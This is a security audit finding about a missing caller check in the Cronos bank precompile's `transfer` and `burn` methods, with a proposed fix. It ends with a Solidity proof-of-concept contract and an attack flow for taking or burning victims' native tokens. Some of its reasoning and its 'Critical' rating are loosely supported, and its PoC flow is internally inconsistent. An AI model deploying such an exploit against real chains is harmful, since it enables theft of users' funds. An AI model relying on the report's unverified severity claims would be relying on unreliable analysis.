### Title
Missing Caller Authorization in Bank Precompile `transfer` and `burn` Allows Any Contract to Drain or Destroy Any User's Native CRC20 Tokens - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The bank precompile's `transfer` and `burn` methods accept an arbitrary address as the token-owner parameter but never verify that `contract.Caller()` equals that address. Any EVM contract can therefore move or destroy native `evm/<caller_address>` tokens from any victim who holds that denom, without the victim's consent.

### Finding Description

`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles three mutating methods.

**`transfer` (lines 167–200):**

```go
sender    := args[0].(common.Address)   // attacker-supplied
recipient := args[1].(common.Address)
// ...
denom := EVMDenom(contract.Caller())    // evm/<calling_contract>
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`sender` (`from`) is taken directly from calldata. There is no check that `contract.Caller() == sender`. Any contract can pass an arbitrary victim address as `sender` and an attacker-controlled address as `recipient`. [1](#0-0) 

**`burn` (lines 113–156):**

```go
recipient := args[0].(common.Address)   // attacker-supplied (the address to burn from)
// ...
denom := EVMDenom(contract.Caller())
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

Again, `addr` is caller-supplied with no check that `contract.Caller() == addr`. [2](#0-1) 

The denom operated on is always `evm/<contract.Caller()>`, so the attacker can only affect tokens whose denom matches their own contract address. This is the exact denom that users accumulate when they call `moveToNative` on a CRC20 contract (confirmed by the integration test):

```python
denom = "evm/" + contract.address
``` [3](#0-2) 

The intended usage pattern (from `TestBank.sol`) is:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return bank.transfer(msg.sender, recipient, amount);
}
``` [4](#0-3) 

The CRC20 contract is supposed to pass `msg.sender` as the sender, but the precompile never enforces this invariant.

### Impact Explanation

**Critical — Unauthorized transfer and burn of CRC20-backed native tokens.**

When a user calls `moveToNative` on a CRC20 contract at address `0xTOKEN`, they receive native bank-module coins of denom `evm/0xTOKEN`. Because the bank precompile does not verify `contract.Caller() == sender`, the CRC20 contract at `0xTOKEN` (or any contract reachable from it) can:

1. Call `bank.transfer(victim, attacker, amount)` → transfers `evm/0xTOKEN` from victim to attacker with no approval.
2. Call `bank.burn(victim, amount)` → destroys `evm/0xTOKEN` held by victim with no approval.

This directly maps to the Critical impact category: *unauthorized transfer/burn of CRC20/CRC21 or precompile-controlled assets*. [5](#0-4) 

### Likelihood Explanation

Any deployed CRC20 contract whose author adds a single public function that forwards attacker-controlled `sender`/`addr` arguments to the bank precompile is immediately exploitable. Because the precompile imposes no on-chain constraint, the vulnerability is latent in every CRC20 contract that uses the bank precompile's `transfer` or `burn` methods. The attacker is fully unprivileged — deploying a contract requires no special permission on Cronos.

### Recommendation

Add a caller-equality guard in both the `transfer` and `burn` branches of `BankContract.Run`:

```go
// transfer
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}

// burn
if contract.Caller() != recipient {   // recipient == addr in burn branch
    return nil, errors.New("burn: caller is not the token owner")
}
```

This mirrors the authorization pattern already used in `utils.go` for proto-based precompile calls:

```go
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", ...)
}
``` [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address addr, uint256 amount) external returns (bool);
}

// Attacker deploys this contract at address 0xATTACK.
// Users who called moveToNative() on a CRC20 at 0xATTACK now hold
// native denom "evm/0xATTACK" tokens in the bank module.
contract BankPrecompileExploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: steal victim's native tokens
    function stealNative(address victim, address attacker, uint256 amount) external {
        // bank precompile does NOT check msg.sender == victim
        // denom = "evm/" + address(this)  →  evm/0xATTACK
        bank.transfer(victim, attacker, amount);
    }

    // Step 2 (alternative): destroy victim's native tokens
    function burnVictim(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

**Attack flow:**

1. Attacker deploys `BankPrecompileExploit` at `0xATTACK`.
2. Users interact with the token and call `moveToNative` → they accumulate `evm/0xATTACK` native tokens.
3. Attacker calls `stealNative(victim, attacker, victimBalance)`.
4. `BankContract.Run` executes `bankKeeper.SendCoins(victim, attacker, coins)` with denom `evm/0xATTACK` — no authorization check fails.
5. Victim's native tokens are transferred to the attacker. [7](#0-6)
